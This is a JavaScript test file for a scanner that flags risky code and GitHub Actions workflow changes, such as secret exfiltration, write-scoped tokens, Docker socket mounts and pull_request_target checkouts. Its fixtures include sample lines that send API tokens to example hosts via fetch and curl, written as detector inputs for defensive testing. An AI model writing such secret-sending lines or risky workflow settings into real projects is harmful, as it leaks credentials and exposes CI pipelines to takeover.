import test from 'node:test';
import assert from 'node:assert/strict';
import { detectJsCapability } from '../dist/detectors/js-capability.js';
import { detectWorkflowPermissions } from '../dist/detectors/workflow-permissions.js';
import { createReport } from '../dist/report.js';

test('js detector flags external fetch', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: "  const response = await fetch('https://api.example.com/v1/events');"
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.external_fetch_added');
});

test('js detector flags env secret exfiltration over external fetch', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 8,
      content:
        "await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } });"
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.external_fetch_added'));
  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.surface, 'source');
  assert.equal(exfilFinding.severity, 'high');
});

test('js detector downgrades test file subprocess findings', () => {
  const findings = detectJsCapability([
    {
      file: 'src/utils/format.test.ts',
      line: 4,
      content: 'execSync("npm test");'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.subprocess_spawn_added');
  assert.equal(findings[0].severity, 'low');
});

test('workflow detector flags write permissions', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 6,
      content: '  contents: write'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_permission_write');
});

test('workflow detector flags broader token write scopes', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/pr-triage.yml',
      line: 7,
      content: '  pull-requests: write'
    },
    {
      file: '.github/workflows/pr-triage.yml',
      line: 8,
      content: '  actions: write'
    }
  ]);

  assert.equal(findings.length, 2);
  assert.ok(findings.every((finding) => finding.kind === 'capability_echo.workflow_permission_write'));
  assert.ok(findings.every((finding) => finding.severity === 'high'));
});

test('workflow detector flags secret exfil pattern', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 18,
      content: 'run: curl https://example.com/hook -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"'
    }
  ]);

  assert.equal(findings.length, 2);
  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern'));
});

test('workflow detector flags secret-backed env vars used in external requests', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 17,
      content: '          API_TOKEN: ${{ secrets.API_TOKEN }}'
    },
    {
      file: '.github/workflows/deploy.yml',
      line: 21,
      content: 'run: curl https://example.com/hook -H "Authorization: Bearer $API_TOKEN"'
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_external_curl'));
  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.line, 21);
  assert.equal(exfilFinding.severity, 'high');
});

test('workflow detector flags inherited reusable workflow secrets', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 22,
      content: '    secrets: inherit'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_secrets_inherit');
  assert.equal(findings[0].surface, 'workflow');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].recommendation, /explicit/);
});

test('workflow detector flags Docker socket mounts', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 22,
      content: 'run: docker run -v /var/run/docker.sock:/var/run/docker.sock agent-runner'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_docker_socket_mount');
  assert.equal(findings[0].severity, 'critical');
});

test('workflow detector flags privileged containers', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 24,
      content: 'run: docker run --privileged agent-runner'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_privileged_container');
  assert.equal(findings[0].severity, 'high');
});

test('workflow detector flags pull_request_target triggers', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_pull_request_target');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].recommendation, /pull_request/);
});

test('workflow detector flags pull_request_target workflows that check out PR head code', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 21,
      content: '          ref: ${{ github.event.pull_request.head.sha }}'
    }
  ]);

  const checkoutFinding = findings.find((finding) => finding.kind === 'capability_echo.workflow_pr_head_checkout_on_target');
  assert.ok(checkoutFinding);
  assert.equal(checkoutFinding.severity, 'high');
  assert.equal(checkoutFinding.line, 21);
  assert.match(checkoutFinding.recommendation, /pull_request/);
});

test('workflow detector does not flag PR head checkout without pull_request_target', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 21,
      content: '          ref: ${{ github.event.pull_request.head.sha }}'
    }
  ]);

  assert.equal(findings.length, 0);
});

test('workflow detector flags self-hosted runners', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 12,
      content: '    runs-on: [self-hosted, linux]'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_self_hosted_runner');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].message, /self-hosted/);
});

test('workflow detector flags multiline self-hosted runner labels', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 12,
      content: '    runs-on:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 13,
      content: '      - self-hosted'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 14,
      content: '      - linux'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_self_hosted_runner');
  assert.equal(findings[0].line, 13);
});

test('workflow detector flags mutable third-party action refs', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '      - uses: third-party/deploy-agent@main'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_mutable_action_ref');
  assert.equal(findings[0].surface, 'workflow');
  assert.equal(findings[0].severity, 'medium');
  assert.match(findings[0].recommendation, /commit SHA/);
});

test('workflow detector ignores local and commit-pinned action refs', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '      - uses: ./.github/actions/build'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 19,
      content: '      - uses: third-party/deploy-agent@0123456789abcdef0123456789abcdef01234567'
    }
  ]);

  assert.equal(findings.length, 0);
});

test('report summarizes mutable workflow action refs with a human label', () => {
  const report = createReport(
    [
      {
        kind: 'capability_echo.source_secret_exfil_pattern',
        surface: 'source',
        severity: 'high',
        file: 'src/api/sync.ts',
        line: 8,
        subject: 'Source secret exfiltration pattern',
        message: 'Added source code sends environment-secret-shaped data to an external endpoint.',
        recommendation: 'Do not send env secrets to external services unless the endpoint and payload are explicitly required.'
      },
      {
        kind: 'capability_echo.workflow_mutable_action_ref',
        surface: 'workflow',
        severity: 'medium',
        file: '.github/workflows/agent.yml',
        line: 18,
        subject: 'GitHub Actions mutable action reference',
        message: 'Workflow uses a mutable third-party action reference.',
        recommendation: 'Pin third-party actions to a reviewed commit SHA before merge.'
      },
      {
        kind: 'capability_echo.workflow_pr_head_checkout_on_target',
        surface: 'workflow',
        severity: 'high',
        file: '.github/workflows/agent.yml',
        line: 21,
        subject: 'GitHub Actions PR-head checkout under pull_request_target',
        message: 'Workflow checks out pull request head code in a pull_request_target workflow.',
        recommendation: 'Use pull_request for untrusted PR code, or avoid checking out PR head code under pull_request_target.'
      },
      {
        kind: 'capability_echo.workflow_secrets_inherit',
        surface: 'workflow',
        severity: 'high',
        file: '.github/workflows/deploy.yml',
        line: 22,
        subject: 'GitHub Actions inherited secrets',
        message: 'Workflow passes all caller secrets to a reusable workflow.',
        recommendation: 'Pass only explicit secrets required by the reusable workflow.'
      }
    ],
    {
      changedFileCount: 1,
      scannedSurfaces: ['workflow']
    }
  );

  assert.deepEqual(report.capabilitySummary, [
    'source secret exfiltration patterns',
    'GitHub Actions mutable action references',
    'GitHub Actions PR-head checkout under pull_request_target',
    'GitHub Actions inherited secrets'
  ]);
});
